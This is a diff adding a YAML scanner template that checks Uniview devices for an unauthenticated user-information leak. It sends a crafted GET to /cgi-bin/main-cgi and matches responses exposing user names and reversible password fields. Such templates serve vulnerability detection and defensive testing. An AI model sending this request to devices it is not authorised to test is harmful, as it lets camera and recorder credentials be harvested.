@@ -1,0 +1,13 @@
+cve-id: uniview-user-disclosure
+manual: true
+transport: http
+rules:
+  - method: GET
+    path: /cgi-bin/main-cgi?json={"cmd":255,"szUserName":"","u32UserLoginHandle":-1}
+    follow_redirects: false
+    expression: |
+      response.status == 200 && response.body.bcontains(b"UserCfg ModuleID=") && response.body.bcontains(b"UserName=") && response.body.bcontains(b"RvsblePass=")
+severity:
+  high
+type:
+  infoleak
